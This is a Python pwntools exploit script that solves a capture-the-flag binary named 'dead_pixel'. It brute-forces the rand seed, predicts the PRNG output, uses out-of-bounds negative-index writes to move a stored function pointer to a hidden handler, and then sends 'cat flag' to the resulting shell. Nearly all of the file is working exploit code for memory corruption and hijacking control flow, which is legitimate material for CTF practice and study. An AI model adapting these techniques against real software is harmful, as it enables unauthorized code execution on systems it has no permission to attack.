from __future__ import annotations

import argparse
import sys
import re
from collections import deque
from pathlib import Path

from pwn import context, process, remote


ROOT = Path(__file__).resolve().parent
BIN = ROOT / "public" / "dead_pixel"

METHOD_OFFSETS = [0x2A40, 0x2A4B, 0x2A57, 0x2A66, 0x2A72, 0x2A7C]
ESCAPE_REALITY = 0x133D
SAFE_SKIP_INDEX = -101


class RandModel:
    def __init__(self, seed: int):
        self.seed = seed
        if seed == 0:
            seed = 1
        self.state = [0] * 344
        self.state[0] = seed
        for i in range(1, 31):
            self.state[i] = (16807 * self.state[i - 1]) % 2147483647
        for i in range(31, 34):
            self.state[i] = self.state[i - 31]
        for i in range(34, 344):
            self.state[i] = (self.state[i - 31] + self.state[i - 3]) & 0xFFFFFFFF
        self.index = 344

    def rand(self) -> int:
        self.state.append((self.state[self.index - 31] + self.state[self.index - 3]) & 0xFFFFFFFF)
        value = (self.state[self.index] >> 1) & 0x7FFFFFFF
        self.index += 1
        return value

    def clone(self) -> "RandModel":
        cloned = RandModel(self.seed)
        cloned.state = self.state[:]
        cloned.index = self.index
        return cloned

    def overflow_attempt(self) -> tuple[bool, int | None]:
        if self.rand() % 10 != 0:
            return False, None
        return True, self.rand() % 6

    def corrupt_delta(self) -> tuple[int, int, int]:
        r1 = self.rand()
        r2 = self.rand()
        r3 = self.rand()
        sign = 1 if r1 % 2 == 0 else -1
        return sign * (r2 & 0xFF), sign * (r1 % 10), r3 % 5000


def recv_menu(io) -> bytes:
    return io.recvuntil(b"5. BREAK FOURTH WALL\n> ", timeout=5)


def overflow(io) -> tuple[bool, bytes]:
    io.sendline(b"3")
    io.recvuntil(b">> Target address: ")
    io.sendline(b"A")
    io.recvuntil(b">> Payload: ")
    io.sendline(b"B")
    out = recv_menu(io)
    return b">> ACK: engine accepted the packet." in out, out


def corrupt(io, index: int) -> bytes:
    io.sendline(b"1")
    io.recvuntil(b"Select packet: ")
    io.sendline(str(index).encode())
    try:
        return recv_menu(io)
    except EOFError:
        tail = io.recvall(timeout=1)
        raise RuntimeError(f"process exited after corrupt index {index}; tail={tail!r}") from None


def final_corrupt_with_command(io, index: int, command: bytes) -> bytes:
    io.sendline(b"1")
    io.recvuntil(b"Select packet: ")
    io.sendline(str(index).encode())
    io.sendline(command)
    return io.recvall(timeout=3)


def parse_memory(stats: bytes) -> int | None:
    match = re.search(rb"\[Memory Integrity\]: (-?\d+)\.", stats)
    return int(match.group(1)) if match else None


def brute_seed(observed: list[bool]) -> list[int]:
    candidates: list[int] = []
    for seed in range(1 << 16):
        model = RandModel(seed)
        ok = True
        for success in observed:
            got = model.rand() % 10 == 0
            if got != success:
                ok = False
                break
            if got:
                model.rand()
        if ok:
            candidates.append(seed)
    return candidates


def find_subset(deltas: list[int], target: int, limit: int = 300) -> list[int]:
    parents: dict[int, tuple[int, int, bool] | None] = {0: None}
    queue = deque([0])
    for i, delta in enumerate(deltas[:limit]):
        current = list(parents)
        for value in current:
            nxt = value + delta
            if -20000 <= nxt <= 20000 and nxt not in parents:
                parents[nxt] = (value, i, True)
                if nxt == target:
                    chosen: list[int] = []
                    cur = target
                    while parents[cur] is not None:
                        prev, idx, used = parents[cur]
                        if used:
                            chosen.append(idx)
                        cur = prev
                    return list(reversed(chosen))
        # Keep an explicit skipped state in the time line by leaving existing
        # sums untouched; callers use the largest chosen index to emit skips.
        queue.clear()
    raise RuntimeError(f"no subset for {target}")


def skip_until_delta(io, model: RandModel, index: int, want: int) -> tuple[int, int, int]:
    while True:
        delta, memory_delta, budget_delta = model.corrupt_delta()
        if delta == want:
            corrupt(io, index)
            return delta, memory_delta, budget_delta
        corrupt(io, SAFE_SKIP_INDEX)


def apply_subset(io, model: RandModel, target_index: int, target_sum: int) -> int:
    future_model = model.clone()
    future = []
    # Clone libc rand state by replaying is awkward; instead consume planned
    # values from the real model into a buffer and then execute that buffer.
    # The process only advances when we send the matching corrupt requests.
    for _ in range(300):
        future.append(future_model.corrupt_delta()[0])
    chosen = set(find_subset(future, target_sum, len(future)))
    memory_delta_total = 0
    for i, delta in enumerate(future[: max(chosen, default=-1) + 1]):
        _, memory_delta, _ = model.corrupt_delta()
        memory_delta_total += memory_delta
        corrupt(io, target_index if i in chosen else SAFE_SKIP_INDEX)
    return memory_delta_total


def plan_final(model: RandModel, start_memory: int, limit: int = 3000) -> list[int]:
    future_model = model.clone()
    future = [future_model.corrupt_delta() for _ in range(limit)]
    parents: list[dict[int, tuple[int, int]]] = []
    states = {start_memory}

    for step, (delta, memory_delta, _) in enumerate(future):
        next_states: dict[int, tuple[int, int]] = {}

        for memory in states:
            if delta == -20 and memory + memory_delta < -200:
                actions = [-103]
                cur = memory
                for previous_step in range(step - 1, -1, -1):
                    prev_memory, action = parents[previous_step][cur]
                    actions.append(action)
                    cur = prev_memory
                return list(reversed(actions))

            for action, extra in ((SAFE_SKIP_INDEX, 0), (-102, delta)):
                nxt = memory + memory_delta + extra
                if -199 <= nxt <= 20000 and nxt not in next_states:
                    next_states[nxt] = (memory, action)

        parents.append(next_states)
        states = set(next_states)

    raise RuntimeError("could not plan final underflow")


def solve(io) -> None:
    recv_menu(io)

    observed: list[bool] = []
    successes = 0
    while successes < 16:
        success, _ = overflow(io)
        observed.append(success)
        successes += int(success)
    print(f"[+] filled packet log in {len(observed)} attempts", file=sys.stderr)

    seeds = brute_seed(observed)
    if len(seeds) != 1:
        raise RuntimeError(f"expected one seed, got {len(seeds)}")
    print(f"[+] recovered seed {seeds[0]}", file=sys.stderr)
    model = RandModel(seeds[0])
    for success in observed:
        model.overflow_attempt()
    memory_cells = -100
    render_stage = 1

    # Make corruption_table[0] non-zero so packet index 16 passes the pointer
    # existence check, then move packet_index from 16 to 17.
    _, mem_delta, _ = model.corrupt_delta()
    memory_cells += mem_delta
    corrupt(io, 0)

    future_model = model.clone()
    future = []
    for _ in range(120):
        future.append(future_model.corrupt_delta()[0])
    chosen = set(find_subset(future, 1, len(future)))
    for i in range(max(chosen) + 1):
        _, mem_delta, _ = model.corrupt_delta()
        memory_cells += mem_delta
        render_stage = 1
        corrupt(io, 16 if i in chosen else SAFE_SKIP_INDEX)
    print("[+] moved packet_index to 17", file=sys.stderr)

    # Keep memory safely above the -200 crash threshold while we adjust the
    # handler pointer.  A modest buffer is enough and keeps the final plan short.
    while memory_cells < 1500:
        delta, mem_delta, _ = model.corrupt_delta()
        if delta > 100:
            memory_cells += delta + mem_delta
            render_stage = 1
            out = corrupt(io, -102)
            parsed = parse_memory(out)
            if parsed is not None:
                memory_cells = parsed
        else:
            memory_cells += mem_delta
            render_stage = 1
            out = corrupt(io, SAFE_SKIP_INDEX)
            parsed = parse_memory(out)
            if parsed is not None:
                memory_cells = parsed
    print(f"[+] memory boosted to {memory_cells}", file=sys.stderr)

    # Store a PIE text pointer into corruption_table[1].
    while True:
        success, method = model.overflow_attempt()
        got, _ = overflow(io)
        if got != success:
            raise RuntimeError("rand model diverged during table[1] write")
        if success:
            assert method is not None
            break
    print(f"[+] wrote method pointer {method}", file=sys.stderr)

    pointer_delta = ESCAPE_REALITY - METHOD_OFFSETS[method]
    print(f"[+] adjusting handler pointer by {pointer_delta}", file=sys.stderr)
    memory_cells += apply_subset(io, model, 1, pointer_delta)
    render_stage = 1
    print(f"[+] handler pointer adjusted, memory={memory_cells}", file=sys.stderr)

    final_actions = plan_final(model, memory_cells)
    print(f"[+] final plan length {len(final_actions)}", file=sys.stderr)
    payload = bytearray()
    for action in final_actions[:-1]:
        delta, mem_delta, _ = model.corrupt_delta()
        memory_cells += mem_delta + (delta if action == -102 else 0)
        payload += b"1\n" + str(action).encode() + b"\n"

    delta, mem_delta, _ = model.corrupt_delta()
    render_stage = 1 + delta
    memory_cells += mem_delta
    payload += b"1\n" + str(final_actions[-1]).encode() + b"\ncat flag\nexit\n"
    io.send(bytes(payload))
    out = io.recvall(timeout=20)
    print(f"[+] render_stage={render_stage}, memory={memory_cells}; should have shell", file=sys.stderr)
    flag = re.search(rb"[A-Za-z0-9_-]+CTF\{[^}\n]+\}", out)
    if flag:
        print(flag.group(0).decode())
    else:
        print(out.decode(errors="replace")[-2000:], end="")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=None)
    parser.add_argument("--port", type=int, default=None)
    args = parser.parse_args()

    context.log_level = "error"
    io = remote(args.host, args.port) if args.host else process(str(BIN), cwd=BIN.parent)
    solve(io)


if __name__ == "__main__":
    main()
